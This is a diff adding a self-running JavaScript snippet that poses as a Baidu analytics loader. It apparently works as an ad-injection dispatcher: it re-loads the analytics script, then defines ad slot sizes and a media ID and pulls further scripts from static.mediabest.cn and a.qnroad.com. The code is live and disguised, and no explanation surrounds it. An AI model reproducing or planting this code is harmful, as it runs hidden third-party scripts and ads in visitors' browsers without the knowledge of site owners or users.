@@ -1,0 +1,82 @@
+
+    (function () {
+        var t = 'hm.baidu.com/hm.js?e265bcd47021f0d9841d0e0bb3c30be2&p=p', m = new Date().getTime(), scriptid = "sid" + m, top_domain = 'mediabest.cn';
+        try {
+            window.source_domain = t.substring(0, t.search('/'));
+        } catch (e) {
+        }
+        var sts = document.getElementsByTagName("script"), find = 'http://' + t, t_async = true;
+        for (var i in sts) {
+            if (!sts[i].src) continue;
+            var ssrc = sts[i].src, flag_i = ssrc.indexOf('#');
+            if (flag_i !== -1) ssrc = ssrc.substr(0, flag_i);
+            if (ssrc == find) {
+                t_async = sts[i].async;
+                break;
+            }
+        }
+        if (t.indexOf("hm.baidu.com/") != -1 || t.indexOf("cnzz.com/") != -1
+            || t.indexOf("www.google-analytics.com/") != -1
+            || t.indexOf("js.users.51.la/") != -1) {
+            if (t.indexOf("https://") < 0)
+                t = t.indexOf("http://") == 0 ? t.replace("http://", "https://") : "https://" + t;
+        } else {
+            t += (t.search("[?]") != -1 ? '&' : '?') + '08022728' + m;
+        }
+        function load_js(js) {
+            try {
+                var a = document.createElement('script');
+                a.type = 'text/javascript';
+                a.charset = "utf8";
+                a.async = true;
+                a.src = js;
+                var s = document.getElementsByTagName('head')[0];
+                s.appendChild(a);
+            } catch (e) {
+                console.log("dispatcher error:", e)
+            }
+        };
+        if (t.indexOf("https://") < 0 && t.indexOf("http://") < 0) {
+            t = "http://" + t;
+        }
+
+        if (t_async)
+            load_js(t);
+        else
+            document.writeln('<scr' + 'ipt id="' + scriptid + '" src="' + t + '"></scr' + 'ipt>');
+
+        if (window._mba) return;
+
+        window._mba = {
+            dversion: '2.0',
+            site: 1,
+            scheme: 'https',
+            rid: '7747eb140bcb4673864d2910438999b1',
+            media_id:216,
+            bis: [],
+            ad_domains: {},
+            dt_bis: [4],
+            dt_domains:{4:"a.qnroad.com"},
+            pf_bid: 0,
+            src: 'hm.baidu.com/hm.js?e265bcd47021f0d9841d0e0bb3c30be2&p=p',
+            pid:0,
+            v: '1.0',
+            pcid:0,
+            paid:0,
+            ref: '',
+            service_domain: '',
+            ads: {'1': '300X250', '8': '160X600', '9': '160X600', '46': '960X120'}
+        };
+        if (window._mba.bis.length > 0) {
+            var a_js = 'https://static.mediabest.cn/js/a.min.js?v20170817';
+            load_js(a_js);
+        }
+        if (window._mba.dt_bis.length > 0) {
+            var dt_js = 'https://static.mediabest.cn/js/dt.min.js?v20170816';
+            load_js(dt_js);
+        }
+        if (window._mba.pf_bid > 0) {
+            var pf_js = 'https://static.mediabest.cn/js/pf.min.js?v20170902';
+            load_js(pf_js);
+        }
+    })();
